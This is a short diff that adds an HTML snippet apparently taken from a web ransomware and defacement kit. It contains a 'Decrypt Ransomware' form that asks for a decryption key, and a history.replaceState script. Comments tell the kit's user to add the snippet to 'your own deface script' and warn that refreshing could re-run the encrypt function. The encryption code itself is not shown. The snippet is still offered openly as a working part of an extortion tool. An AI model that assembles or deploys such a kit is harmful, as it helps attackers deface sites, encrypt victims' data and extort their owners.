@@ -1,0 +1,17 @@
+<!--- you MUST add this code to your own deface script for the decryptor later!  -->
+
+<form action="" method="post" style=" text-align: center;">
+                <input type="text" name="key" class="inpute" placeholder="Decryption Key" autocomplete="off"><br><br>
+                <br>
+                <input type="submit" name="submit" class="submite" value="Decrypt Ransomware" />
+ </form>
+ 
+ <!-- -->
+ 
+ <!-- Optional! add this in the bottom of your script . 
+ after post method, if you refresh the page so it will not loop the encrypt function that cause data corrupt! ---->
+   <script>
+    if ( window.history.replaceState ) {
+        window.history.replaceState( null, null, window.location.href );
+    }
+</script>
